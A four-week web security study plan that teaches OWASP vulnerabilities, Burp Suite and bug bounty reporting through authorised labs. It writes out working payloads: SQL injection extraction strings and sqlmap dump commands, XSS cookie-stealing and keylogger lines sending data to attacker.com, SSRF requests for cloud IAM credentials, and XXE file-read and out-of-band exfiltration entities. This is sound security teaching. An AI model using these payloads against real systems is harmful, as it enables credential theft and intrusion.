# Month 8 — Week-by-Week Study Plan
## Web Application Security: OWASP, Burp Suite, and Bug Bounty

**Total study time: ~80 hours over 4 weeks**

> **Legal reminder:** All web security practice must be on systems you own, official CTF/lab platforms (PortSwigger Web Security Academy, TryHackMe, HackTheBox), or bug bounty programmes with an authorised scope. Never test real websites without explicit written authorisation.

---

## Week 1 — OWASP Top 10 and HTTP Fundamentals

**Goal:** Understand the most critical web vulnerabilities and how HTTP works at the protocol level.

### Day 1 — HTTP Deep Dive
- **Read:** `01-owasp-web-attacks.md` — HTTP section
- **HTTP is the language of web attacks.** You must understand every header:
  ```http
  GET /dashboard?user_id=42 HTTP/1.1
  Host: example.com
  Cookie: session=eyJhbGciOiJIUzI1NiJ9...
  Authorization: Bearer eyJhbGciOiJSUzI1NiJ9...
  X-Forwarded-For: 10.0.0.1    (can be spoofed)
  Referer: https://example.com/login
  User-Agent: Mozilla/5.0 ...
  ```
  Response headers that matter for security:
  ```http
  Content-Security-Policy: default-src 'self'; script-src 'nonce-abc123'
  X-Frame-Options: DENY                    (prevents clickjacking)
  Strict-Transport-Security: max-age=31536000; includeSubDomains
  X-Content-Type-Options: nosniff
  Set-Cookie: session=abc; Secure; HttpOnly; SameSite=Strict
  ```
- **HTTP methods and what they're for:**
  - GET: Retrieve resource (should have no side effects)
  - POST: Create/submit data (form submissions, API calls)
  - PUT: Replace a resource entirely
  - PATCH: Partial update
  - DELETE: Delete a resource
  - OPTIONS: What methods does the server support?
  - HEAD: Like GET but no body (check if resource exists)

### Day 2 — Setting Up Burp Suite Professional Workflow
- **Download Burp Suite Community Edition (free):** portswigger.net/burp
- **Essential Burp Suite setup:**
  ```
  1. Configure browser proxy: Settings → Network → Proxy → 127.0.0.1:8080
  2. Install Burp CA certificate (Proxy → CA Certificate → Download → Install in browser)
  3. Turn off intercept (Proxy → Intercept → Off) for normal browsing
  4. Turn ON intercept when you want to catch and modify specific requests
  ```
- **Core Burp Suite tools:**
  - **Proxy:** Intercept and modify HTTP/HTTPS traffic between browser and server
  - **Repeater:** Send the same request multiple times with modifications — essential for manual testing
  - **Intruder:** Automate requests with payload lists — fuzzing, brute force (slow in Community edition)
  - **Decoder:** Encode/decode Base64, URL, HTML entities, hex
  - **Comparer:** Diff two requests or responses — find what changed
  - **Scanner (Pro only):** Automated vulnerability scanning
- **First practice:** Navigate to a PortSwigger Web Security Academy lab, capture the traffic in Burp Proxy, examine the requests

### Day 3 — SQL Injection Deep Dive
- **How SQLi works:**
  ```
  Normal query:  SELECT * FROM users WHERE id = '42'
  Injected:      SELECT * FROM users WHERE id = '42' OR '1'='1'
  Result: Returns ALL users (1=1 is always true)
  ```
- **SQLi types:**
  - **Classic (in-band):** Results returned directly in the HTTP response
  - **Blind Boolean:** App behavior changes (true vs false condition) — no data returned directly
  - **Blind Time-based:** App delays when condition is true (SLEEP() / BENCHMARK())
  - **Out-of-band:** Data returned via DNS/HTTP to an external server (rare, needs specific permissions)

- **Manual SQLi testing in Burp Repeater:**
  ```
  # Test basic injection
  1'       # Causes error? → SQLi possible
  1 OR 1=1 # Returns all rows?
  
  # Determine column count (UNION-based)
  1 ORDER BY 1--    # Works
  1 ORDER BY 2--    # Works  
  1 ORDER BY 3--    # Error → 2 columns
  
  # Extract data
  1 UNION SELECT username, password FROM users--
  
  # Extracting database name
  1 UNION SELECT database(), 2--
  ```
- **SQLMap (automated SQLi):**
  ```bash
  # Test a URL parameter
  sqlmap -u "http://target.com/item?id=1" --dbs
  sqlmap -u "http://target.com/item?id=1" -D target_db --tables
  sqlmap -u "http://target.com/item?id=1" -D target_db -T users --dump
  
  # Test POST request (save the Burp request as a file)
  sqlmap -r login_request.txt --dbs
  ```
- **Defence:** Always use parameterised queries/prepared statements — no string concatenation

### Day 4 — Cross-Site Scripting (XSS)
- **Three types of XSS:**
  - **Stored XSS:** Malicious script is saved in the database (comments, profiles) — fires whenever someone views the content
  - **Reflected XSS:** Script is in the URL → echoed back in the response → fires when victim clicks the malicious URL
  - **DOM-based XSS:** Script modifies the DOM client-side, never reaches the server

- **Testing for XSS:**
  ```javascript
  // Basic payload — does it fire?
  <script>alert(1)</script>
  
  // If HTML escaping is applied, try event handlers:
  <img src=x onerror=alert(1)>
  <svg onload=alert(1)>
  
  // Steal cookies (what an attacker does)
  <script>document.location='https://attacker.com/steal?c='+document.cookie</script>
  
  // Keylogger
  <script>document.onkeypress=function(e){new Image().src='https://attacker.com/key?k='+e.key}</script>
  ```
- **XSS Practice:** PortSwigger Web Security Academy → XSS labs (all free)
- **Defence:** Output encoding (HTML entities), Content Security Policy (CSP), HttpOnly cookies (prevents cookie theft via XSS)

### Day 5 — Broken Access Control + IDOR
- **IDOR (Insecure Direct Object Reference):**
  ```
  # You're logged in as user ID 42, viewing your profile:
  GET /api/profile?user_id=42
  
  # Change the ID to someone else's:
  GET /api/profile?user_id=43  ← Should fail. If it returns their data → IDOR vulnerability
  ```
- **IDOR testing methodology:**
  1. Log in as User A, create an object (post, order, profile, document)
  2. Note the ID of the object you created
  3. Log in as User B (or no auth), try to access User A's object by ID
  4. If successful → IDOR

- **Horizontal vs vertical privilege escalation:**
  - **Horizontal:** User A accessing User B's data (same privilege level)
  - **Vertical:** Normal user accessing admin functionality

- **Testing admin functions without being admin:**
  ```
  # Try: /admin, /admin.php, /administrator, /manage, /dashboard
  # Check if just adding ?admin=true or header Admin: true bypasses checks
  # Test changing your account's role field in API responses
  ```
- **Complete quiz questions 1-7 from `quiz-08.json`**

---

## Week 2 — Advanced Web Vulnerabilities

**Goal:** Master SSRF, XXE, authentication attacks, and business logic flaws.

### Day 6 — Server-Side Request Forgery (SSRF)
- **Read:** `01-owasp-web-attacks.md` — SSRF section
- **What SSRF does:** Forces the server to make HTTP requests to an internal resource or the attacker's server. The request comes FROM the server, so it can reach internal services (databases, cloud metadata) that are not accessible from the internet.

- **Classic SSRF attack — Cloud metadata:**
  ```
  # Application fetches a URL you control:
  POST /api/fetch-preview
  {"url": "https://example.com/logo.png"}
  
  # Change it to:
  {"url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/"}
  # If vulnerable: returns AWS IAM credentials!
  # 169.254.169.254 is the AWS/GCP/Azure metadata endpoint
  ```
- **SSRF bypass techniques:**
  ```
  # Direct IP bypass (if the app filters "localhost")
  http://127.0.0.1/secret
  http://[::1]/secret         # IPv6 loopback
  http://0.0.0.0/secret
  http://2130706433/          # 127.0.0.1 in decimal
  
  # DNS rebinding: SSRF via a domain that resolves to internal IP
  
  # Open redirect chained with SSRF
  http://trusted-site.com/redirect?url=http://169.254.169.254/
  ```

### Day 7 — XML External Entity (XXE) Injection
- **When XML is processed:** Any API accepting XML, SOAP web services, SVG upload features, file upload parsing XML documents

- **XXE payloads:**
  ```xml
  <!-- Read local files -->
  <?xml version="1.0"?>
  <!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
  <root>&xxe;</root>
  
  <!-- SSRF via XXE -->
  <?xml version="1.0"?>
  <!DOCTYPE root [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]>
  <root>&xxe;</root>
  
  <!-- Blind XXE with out-of-band exfiltration -->
  <!DOCTYPE root [<!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd"> %xxe;]>
  ```
- **Testing:** If you find any feature accepting XML (including SOAP APIs, document uploads), test for XXE

### Day 8 — Authentication and Session Vulnerabilities
- **JWT (JSON Web Token) attacks:**
  ```python
  # JWT structure: header.payload.signature (base64url encoded)
  # Decode without verification:
  import base64, json
  parts = token.split('.')
  header = json.loads(base64.urlsafe_b64decode(parts[0] + '=='))
  payload = json.loads(base64.urlsafe_b64decode(parts[1] + '=='))
  
  # Common JWT attacks:
  # 1. Algorithm None: change "alg": "HS256" to "alg": "none", remove signature
  # 2. HS256 → RS256 confusion: sign with the server's public key as the HMAC secret
  # 3. Weak secret: brute force the HMAC key with hashcat -m 16500
  # 4. kid injection: if kid parameter used in SQL query → SQLi
  ```
- **Session fixation:** Server accepts user-supplied session IDs
  1. Attacker gets a valid session ID (or sets one)
  2. Tricks victim into authenticating with that session ID
  3. Attacker now has a valid authenticated session

- **Session hijacking via XSS:** `document.cookie` → attacker's server (why HttpOnly matters)

- **Password reset vulnerabilities:**
  - Predictable token (timestamp-based, username-based)
  - Token not invalidated after use
  - Token sent in Referer header (leaks to third-party analytics)
  - No expiration on reset token

### Day 9 — Complete Lab-08-a
- **Complete `lab-08-a.json`** — all 5 steps
- **PortSwigger Web Security Academy practice:**
  - Do all "APPRENTICE" level labs for: SQL injection, XSS, SSRF, XXE
  - These are free, fully self-contained lab environments
  - portswigger.net/web-security → Pick a category → Start "Apprentice" labs

### Day 10 — Business Logic Vulnerabilities and Complete Lab-08-b
- **Complete `lab-08-b.json`** — all 5 steps
- **Business logic vulnerabilities** can't be detected by scanners — they require understanding what the application SHOULD do:
  ```
  # Price manipulation: apply -10% discount repeatedly (negative prices)
  # Race condition: buy item twice in parallel before inventory check
  # Workflow bypass: skip step 3 (payment) and go straight to step 4 (confirm)
  # Mass assignment: modify fields the API shouldn't accept
  #   POST /api/user {"username": "alice", "role": "admin"}  ← If role is accepted
  ```
- **Testing approach:** Understand the intended business flow → then try every step out of order, with invalid values, skipped, doubled, repeated, applied in wrong sequence

---

## Week 3 — Bug Bounty Methodology and Advanced Topics

### Day 11 — Burp Suite Advanced Techniques
- **Burp Repeater advanced use:**
  - Import request from Proxy → Repeater
  - Change one parameter at a time
  - Compare responses for subtle differences (length, time, error messages)

- **Burp Intruder (manual fuzzing in Community edition):**
  ```
  # Send request to Intruder
  # Mark injection points with § markers: §FUZZ§
  # Select Attack type: Sniper (single position, single wordlist)
  # Payloads: SQLi payload list, XSS payloads, directory names
  # Analyse responses: sort by length or status code to find interesting differences
  ```
- **Custom Burp Extensions (BApp Store):**
  - **Active Scan++:** More thorough scanning
  - **JSON Web Tokens:** JWT decoding/attacking
  - **Param Miner:** Find hidden parameters
  - **Retire.js:** Detect vulnerable JavaScript libraries

### Day 12 — API Security Testing
- **REST API testing methodology:**
  ```
  # 1. Discover endpoints
  # - Look in JavaScript files: grep for /api/
  # - Check robots.txt, sitemap.xml
  # - Use Burp's target map
  
  # 2. Enumerate API documentation
  # Try: /api/docs, /swagger, /openapi.json, /api/v1/
  
  # 3. Test each endpoint with:
  # - Missing/invalid auth tokens
  # - Wrong HTTP method (GET instead of POST)
  # - Different Content-Type headers
  # - Fuzzing parameters with boundary values
  
  # 4. Check for mass assignment
  # Send additional properties not in the API spec
  # {"email": "user@example.com", "role": "admin", "credit": 9999}
  ```
- **GraphQL security testing:**
  ```
  # Introspection query — reveals the entire API schema
  {"query": "{ __schema { types { name } } }"}
  
  # Find all queries/mutations
  {"query": "{ __schema { queryType { fields { name } } } }"}
  
  # If introspection is disabled — use field fuzzing
  # Common vulnerability: GraphQL allows batch queries → DoS / brute force
  ```

### Day 13 — Bug Bounty Platforms
- **Getting started with bug bounty:**
  - **HackerOne:** hackerone.com — Many public programmes (no invite needed)
  - **Bugcrowd:** bugcrowd.com — Similar, many public programmes
  - **Intigriti:** intigriti.com — European-focused
  - **YesWeHack:** French platform, some Indian company programmes

- **Choosing your first target:**
  - Look for programmes with a large scope (more attack surface = more to find)
  - "VDP" (Vulnerability Disclosure Programme) = no money, but good for practice
  - Avoid programmes with very narrow scopes
  - Focus on the assets in scope — don't test out-of-scope assets

- **Writing a good bug bounty report:**
  ```
  Title: [Severity] - [Vulnerability Type] in [Feature Name]
  
  **Severity:** High (CVSS 8.1)
  
  **Description:** [Clear, concise explanation of what the bug is]
  
  **Steps to Reproduce:**
  1. Log in to the application
  2. Navigate to /profile/edit
  3. Change the user_id parameter to another user's ID: ...
  4. Observe that the response returns the other user's personal data
  
  **Impact:** An authenticated user can access any other user's private profile data, 
  including email, phone number, and address.
  
  **Supporting Evidence:** [Screenshot/video/Burp request-response]
  
  **Suggested Fix:** Validate that the requested user_id matches the authenticated 
  user's session, or use a server-side lookup of the user's own ID.
  ```

### Day 14 — DVWA and PentesterLab
- **Damn Vulnerable Web Application (DVWA):**
  ```bash
  # Run with Docker
  docker run --rm -it -p 80:80 vulnerables/web-dvwa
  # Access: http://localhost/
  # admin:password
  # Set security to Low, then Medium, then High for each vulnerability
  ```
- **Complete in DVWA (set to "Low" first, then try "Medium" and "High"):**
  - [ ] SQL Injection
  - [ ] XSS (Reflected)
  - [ ] XSS (Stored)
  - [ ] CSRF
  - [ ] File Inclusion
  - [ ] Command Injection
  - [ ] File Upload bypass

- **PentesterLab:** pentesterlab.com — Free exercises on specific CVEs and techniques

### Day 15 — Review and Exercises
- **Complete:** `exercises-08.md` questions 1-15
- **Practice:** Complete 2 more PortSwigger Web Security Academy labs for SSRF and XXE (PRACTITIONER level — harder)
- **Watch:** OWASP AppSec conference talks on YouTube for advanced techniques

---

## Week 4 — Mastery, Report Writing, and Portfolio

### Day 16-17 — Web Application Pentest Report
- Complete `assignment-08.md` Tasks 1 and 2
- **Practice writing a complete web application pentest report:**
  - Test your DVWA instance at "Medium" level (more realistic)
  - Document each finding in professional format
  - Include: OWASP Top 10 mapping, CVSS score, proof-of-concept steps, evidence, recommendation

### Day 18-19 — Bug Bounty Practice
- Complete `assignment-08.md` Tasks 3 and 4
- **Attempt a real (or well-known VDP) programme:**
  - Start with a company that has a simple web app
  - Focus on IDOR and access control first (most common and easiest to explain)
  - Document your methodology even if you find nothing — the process is the learning

### Day 20 — Final Assessment
- **Complete:** `exercises-08.md` questions 16-25
- **Quiz:** `quiz-08.json` — all 15 questions
- **Competency checklist:**
  - [ ] Intercept and modify an HTTP request in Burp Suite Proxy
  - [ ] Manually exploit a SQL injection to extract data (in DVWA or PortSwigger)
  - [ ] Craft an XSS payload that pops an alert
  - [ ] Identify an IDOR vulnerability and explain why it's a security risk
  - [ ] Decode and analyse a JWT token manually
  - [ ] Explain what SSRF is and demonstrate a cloud metadata attack
  - [ ] Exploit XXE to read a local file
  - [ ] Write a professional bug bounty report for a fictional IDOR finding
  - [ ] Explain what CSP is and how it mitigates XSS
  - [ ] Describe the OWASP Top 10 (2021) from memory with one example each
